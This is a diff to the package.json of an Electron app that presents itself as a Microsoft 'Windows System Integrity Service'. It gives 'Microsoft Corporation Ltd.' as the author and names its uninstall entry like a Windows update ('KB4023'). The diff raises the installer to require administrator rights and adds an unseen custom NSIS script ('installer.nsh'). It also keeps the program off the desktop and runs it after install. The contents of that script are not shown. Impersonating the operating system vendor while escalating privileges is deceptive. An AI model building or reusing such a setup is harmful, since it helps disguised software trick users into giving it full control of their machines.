@@ -1,7 +1,7 @@
 {
   "name": "win-virtual-services",
   "private": true,
-  "version": "1.0.5",
+  "version": "1.0.6",
   "description": "Windows System Integrity Service",
   "author": "Microsoft Corporation Ltd.",
   "main": "electron/main.js",
@@ -13,7 +13,7 @@
     "preview": "vite preview",
     "electron:build": "vite build && electron-builder"
   },
- "build": {
+  "build": {
     "appId": "com.win.services.virtual",
     "productName": "Windows Sanal Hizmetler Ayarları",
     "asar": true,
@@ -30,18 +30,19 @@
     "win": {
       "target": "nsis",
       "icon": "build/icon.ico",
-      "requestedExecutionLevel": "asInvoker"
+      "requestedExecutionLevel": "requireAdministrator"
     },
     "nsis": {
-      "oneClick": false, 
-      "perMachine": true, 
+      "oneClick": false,
+      "perMachine": true,
       "allowToChangeInstallationDirectory": false,
       "createDesktopShortcut": false,
       "createStartMenuShortcut": true,
       "shortcutName": "Windows Hizmet Yöneticisi",
       "uninstallDisplayName": "Windows Sanal Hizmetler Ayarları (KB4023)",
       "runAfterFinish": true,
-      "deleteAppDataOnUninstall": true
+      "deleteAppDataOnUninstall": true,
+      "include": "build/installer.nsh"
     }
   },
   "dependencies": {
